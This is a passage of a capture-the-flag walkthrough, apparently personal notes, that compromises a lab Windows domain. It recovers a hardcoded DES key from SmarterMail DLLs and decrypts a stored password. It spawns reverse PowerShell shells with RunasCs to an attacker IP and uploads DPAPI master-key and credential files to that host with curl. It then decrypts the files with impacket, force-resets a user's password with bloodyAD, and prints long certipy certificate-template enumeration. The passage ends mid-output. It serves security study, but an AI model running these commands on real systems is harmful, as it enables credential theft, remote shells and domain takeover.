- I had also opened SmarterMail.Standard.dll (or right click on CryptographyHelper function and click "Find in Assembly Explorer"
![[Pasted image 20260814063725.png]]

- Checking `InternalSetKey9string key, bute{}?, salt): void' we see based on the hardcoded string, keymap1 or keymap2 is used.
```
public void SetKey(byte[] keyIn, byte[] ivIn)
  {
    int length = this.Method != 0 ? 5 : 8;
    this.Key = new byte[length];
    this.IV = new byte[length];
    Array.Copy((Array) keyIn, 0, (Array) this.Key, 0, length);
    Array.Copy((Array) ivIn, 0, (Array) this.IV, 0, length);
  }

  private void InternalSetKey(string key, byte[]? salt = null)
  {
    if (this.Method == 0 && salt == null && key == "@7d5fd09%a842^e83e!dc9f6")
    {
      this.Key = this.keymap1.key;
      this.IV = this.keymap1.iv;
    }
    else if (this.Method == 0 && salt == null && key == "a3oij89FF!apoife")
    {
      this.Key = this.keymap2.key;
      this.IV = this.keymap2.iv;
    }
    else
    {
      int cb = this.Method != 0 ? 5 : 8;
      if (salt == null)
        salt = new byte[4]
        {
          (byte) 155,
          (byte) 26,
          (byte) 93,
          (byte) 86
        };
      PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(key, salt);
      this.Key = passwordDeriveBytes.GetBytes(cb);
      this.IV = passwordDeriveBytes.GetBytes(cb);
    }
  }
```

![[Pasted image 20260814063932.png]]

- And looking in `MailService.dll` the second string is used to encode the password string:
```
public static string EncryptPassword(string password)
{
    return CryptographyHelper.EncodeToBase64(0, "a3oij89FF!apoife", password);
}
```

![[Pasted image 20260814063610.png]]

- So we know that our encrypted password was encrypted using keymap2 and we also know the values of keymap2.

- The overall flow for both encryption and decryption would be:
```
EncryptPassword() 
    → CryptographyHelper.EncodeToBase64(0, "a3oij89FF!apoife", password)
        → InternalSetKey("a3oij89FF!apoife")
            → hits second if-branch
                → Key = keymap2.Item1  (8 bytes)
                → IV  = keymap2.Item2  (8 bytes)
                    → DES CBC encrypt
                        → base64 encode
                            → "66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"


# to decrypt would be the reverse:

base64 decode "66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
    → DES CBC decrypt
        → Key = keymap2.Item1
        → IV  = keymap2.Item2
            → noah.b's plaintext password
```
- Using this we can decrypt the password with the following python code:
```
cat decrypt_final.py 

---OUTPUT---
from Crypto.Cipher import DES
import base64

key = bytes([180, 63, 132, 209, 16, 180, 233, 145])
iv  = bytes([1, 216, 174, 230, 73, 173, 146, 39])

ciphertext = base64.b64decode("66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby")

cipher = DES.new(key, DES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)

# Strip PKCS5 padding
pad_len = plaintext[-1]
plaintext = plaintext[:-pad_len]

print("Password:", plaintext.decode('utf-8'))

```

- This gives us the decrypted password `RiverDragon#Storm25` for the user `noah.b`
![[Pasted image 20260814064333.png]]

- In my `svc_mail` shell I grab `RunasCs.exe` so I can switch to user `noah.b`
```
curl.exe http://10.10.16.19/RunasCs.exe -o C:\ProgramData\RunasCs.exe
```

- I then run the following command and grab the shell on my listener as `noah.b`:
```
.\RunasCs.exe noah.b RiverDragon#Storm25 powershell.exe -r 10.10.16.19:9999 

# note using the arguments --bypass-uac --logon-type '8' causes issues due to the double pivot.

---OUTPUT---
[*] Warning: The logon for user 'noah.b' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 7132 created in background.
```

![[Pasted image 20260814064810.png]]

- I grab the user flag:
![[Pasted image 20260814070055.png]]

- I check for stored credentials:
```
cmdkey /list

---OUTPUT---
Currently stored credentials:                                                                                               

    Target: Domain:target=PC01.danglingtree.htb
    Type: Domain Password
    User: alex.o
```

![[Pasted image 20260814070246.png]]

- We see there are stored credentials for user `alex.o`
- Now we need to locate the credential blob and master key to decrypt it. Generally the flow of DPAPI would be:
```
noah.b's password
    → derives → noah.b's DPAPI master key
        → decrypts → credential blob
            → reveals → alex.o's saved password
```

- To find the master key we search:
```
dir C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\ -Force -Recurse

---OUTPUT---


    Directory: C:\Users\noah.b\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-         3/26/2026   2:23 PM                S-1-5-21-4220238332-57023728-1129110646-1602                         
-a-hs-         3/26/2026   2:23 PM             24 CREDHIST                                                             
-a-hs-         3/26/2026   2:23 PM             76 SYNCHIST                                                             


    Directory: C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-         3/26/2026   2:23 PM            924 BK-DANGLINGTREE                                                      
-a-hs-         3/26/2026   2:23 PM            876 f53fcaba-f057-48e8-8f92-0180d274bf0f                                 
-a-hs-         3/26/2026   2:23 PM             24 Preferred
```

- We get the SID : `S-1-5-21-4220238332-57023728-1129110646-1602`  and GUID `f53fcaba-f057-48e8-8f92-0180d274bf0f` of the master key

- Now to get the credential blob:
```
dir C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\ -Force
---OUTPUT---
    Directory: C:\Users\noah.b\AppData\Roaming\Microsoft\Credentialsdir C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\ -Force


    Directory: C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-         3/27/2026   3:03 PM            490 57FFB67D684C67F09E7153B9C7CC3940                                     
```

- Now we have the path for both, we have to send it to our Kali machine. Set up the receiver we had earlier and send it via curl:
```
---ON-KALI---
python3 recv.py

---TARGET-CURL-SEND---
curl.exe -X PUT -T "C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f" http://10.10.16.19:8000/f53fcaba-f057-48e8-8f92-0180d274bf0f

curl.exe -X PUT -T "C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940" http://10.10.16.19:8000/57FFB67D684C67F09E7153B9C7CC3940
```
![[Pasted image 20260814071631.png]]

- Then I first decrypt the master key on kali to get the master key hex string:
```
impacket-dpapi masterkey -file f53fcaba-f057-48e8-8f92-0180d274bf0f -password 'RiverDragon#Storm25' -sid S-1-5-21-4220238332-57023728-1129110646-1602

---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : f53fcaba-f057-48e8-8f92-0180d274bf0f
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000000 (0)
DomainKeyLen: 000001ac (428)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
```
![[Pasted image 20260814071841.png]]

- Then with the hex string I can decrypt the credential blob:
```
impacket-dpapi credential -file 57FFB67D684C67F09E7153B9C7CC3940 -key 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8

---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2026-03-27 22:03:38+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PC01.danglingtree.htb
Description : 
Unknown     : 
Username    : alex.o
Unknown     : SunsetMountainPeak@2025
```
![[Pasted image 20260814072007.png]]

- We get credentials for `alex.o` : `SunsetMountainPeak@2025`

- However running RunasCs.exe here fails at first as there is no User directory for this user. However, we can use the argument to force create it (although we don't really need it):
```
.\RunasCs.exe alex.o SunsetMountainPeak@2025 powershell.exe -r 10.10.16.19:9999 --force-profile --bypass-uac --logon-type '8'

---OUTPUT---
[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 7464 created in background.
```
![[Pasted image 20260814072313.png]]

- I grab bloodhound files to analyze:
```
bloodhound-python -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' -ns 10.129.72.173 -c All --zip

---OUTPUT---
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: danglingtree.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.danglingtree.htb
INFO: Testing resolved hostname connectivity dead:beef::dd7a:49ff:ce34:8d85
INFO: Trying LDAP connection to dead:beef::dd7a:49ff:ce34:8d85
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.danglingtree.htb
INFO: Testing resolved hostname connectivity dead:beef::dd7a:49ff:ce34:8d85
INFO: Trying LDAP connection to dead:beef::dd7a:49ff:ce34:8d85
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 9 users
INFO: Found 61 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.danglingtree.htb
INFO: Done in 00M 17S
INFO: Compressing output into 20260813055859_bloodhound.zip
```

![[Pasted image 20260814082742.png]]

- I unzip it with the `unzip` command and open it with bloodhound. There I find an outbound rule for `alex.o` who is a part of  `Support-IT` group that can force change a password of a user `jake.h`. Using bloodyAD I manage to change the password to `Password123!`:
```
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'alex.o' -p 'SunsetMountainPeak@2025' set password jake.h 'Password123!'

[+] Password changed successfully!
```
![[Pasted image 20260814083553.png]]

- I can then get a shell as jake.h use the RunasCs.exe:
```
.\RunasCs.exe jake.h Password123! powershell.exe -r 10.10.16.19:9999

---OUTPUT---
[*] Warning: User profile directory for user jake.h does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'jake.h' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6640 created in background.
```
![[Pasted image 20260814083917.png]]

- Checking groups I see he is part of some Certificate groups which leads me to check certificate issues:
![[Pasted image 20260814084025.png]]

- Using bloodyAD we check writeable objects by `jake.h`:
```
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'jake.h' -p 'Password123!' get writable


---OUTPUT---
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=danglingtree,DC=htb
permission: WRITE

distinguishedName: CN=jake.h,CN=Users,DC=danglingtree,DC=htb
permission: WRITE

distinguishedName: CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.danglingtree.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=danglingtree,DC=htb
permission: CREATE_CHILD
```
![[Pasted image 20260814084528.png]]

- We see we have `CREATE_CHILD` permissions on `Certificate Templates` and `OID`

- We list the templates:
```
certipy-ad find -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.72.173 -stdout

---OUTPUT---
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : danglingtree-DC-CA
    DNS Name                            : dc.danglingtree.htb
    Certificate Subject                 : CN=danglingtree-DC-CA, DC=danglingtree, DC=htb
    Certificate Serial Number           : 6E77D503246E55B34D28C464F186BD4B
    Certificate Validity Start          : 2026-08-03 16:32:49+00:00
    Certificate Validity End            : 2126-08-03 16:42:49+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DANGLINGTREE.HTB\Administrators
      Access Rights
        Enroll                          : DANGLINGTREE.HTB\Authenticated Users
        ManageCertificates              : DANGLINGTREE.HTB\Helpdesk_Cert_Support
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
        ManageCa                        : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Authenticated Users
    [+] User ACL Principals             : DANGLINGTREE.HTB\Helpdesk_Cert_Support
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 29219 days
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-06-05T23:40:54+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Enterprise Read-only Domain Controllers
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
  1
    Template Name                       : OCSPResponseSigning
    Display Name                        : OCSP Response Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AddOcspNocheck
                                          Norevocationinfoinissuedcerts
    Extended Key Usage                  : OCSP Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : msPKI-Asymmetric-Algorithm`PZPWSTR`RSA`msPKI-Hash-Algorithm`PZPWSTR`SHA1`msPKI-Key-Security-Descriptor`PZPWSTR`D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;GR;;;S-1-5-80-3804348527-3718992918-2141599610-3686422417-2726379419)`msPKI-Key-Usage`DWORD`2`
    Authorized Signatures Required      : 0
    Schema Version                      : 3
    Validity Period                     : 2 weeks
    Renewal Period                      : 2 days
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  2
    Template Name                       : RASAndIASServer
    Display Name                        : RAS and IAS Server
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\RAS and IAS Servers
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\RAS and IAS Servers
  3
    Template Name                       : Workstation
    Display Name                        : Workstation Authentication
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Computers
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Computers
                                          DANGLINGTREE.HTB\Enterprise Admins
  4
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Enterprise Read-only Domain Controllers
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
  5
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Enterprise Read-only Domain Controllers
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
  6
    Template Name                       : KeyRecoveryAgent
    Display Name                        : Key Recovery Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PendAllRequests
                                          PublishToKraContainer
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Key Recovery Agent
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  7
    Template Name                       : CAExchange
    Display Name                        : CA Exchange
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Extended Key Usage                  : Private Key Archival
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 week
    Renewal Period                      : 1 day
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  8
    Template Name                       : CrossCA
    Display Name                        : Cross Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Qualified Subordination
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  9
    Template Name                       : ExchangeUserSignature
    Display Name                        : Exchange Signature Only
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
